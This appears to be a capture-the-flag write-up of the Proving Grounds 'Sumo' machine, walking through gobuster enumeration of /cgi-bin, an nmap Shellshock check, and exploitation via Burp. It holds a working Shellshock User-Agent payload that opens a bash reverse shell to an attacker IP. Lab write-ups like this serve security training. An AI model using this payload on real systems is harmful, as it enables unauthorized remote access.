---
layout: default
title: Shellshock
parent: Web Exploits
nav_order: 10
---

# Shellshock

---

Gobuster returns _/cgi-bin_ directory.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ gobuster dir -u http://192.168.222.87 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 80 -f -x php,txt,html
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.222.87
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt,html
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/11/03 22:56:32 Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 290]
/icons/               (Status: 403) [Size: 288]
/.html/               (Status: 403) [Size: 288]
/doc/                 (Status: 403) [Size: 286]

```

Rerun Gobuster against the _/cgi-bin_ directory and locate a _/test_ directory.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ gobuster dir -u http://192.168.222.87/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 80 -f -x php,txt,html
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.222.87/cgi-bin
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt,html
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/11/03 22:59:33 Starting gobuster in directory enumeration mode
===============================================================
/.html/               (Status: 403) [Size: 296]
/local.txt/           (Status: 500) [Size: 619]
/test/                (Status: 200) [Size: 14]

```

Run nmap script for shellshock against

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/sumo]
└─$ sudo nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/test 192.168.222.87
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 23:01 EDT
Nmap scan report for 192.168.222.87
Host is up (0.054s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       http://seclists.org/oss-sec/2014/q3/685
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271

Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds
```

# Exploitation

---

## Shellshock

Intercept a GET request to /cgi-bin/test in Burp and send to Repeater

![burp1](../../../../assets/images/ctfs/proving_grounds/sumo/burp1.png)

Add the bash reverse shell one-liner to the User-Agent header in the GET request.

```bash
User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/192.168.45.217/9001 0>&1
```

![burp2](../../../../assets/images/ctfs/proving_grounds/sumo/burp2.png)

Get a reverse shell back in our netcat listener.

![shell](../../../../assets/images/ctfs/proving_grounds/sumo/shell.png)
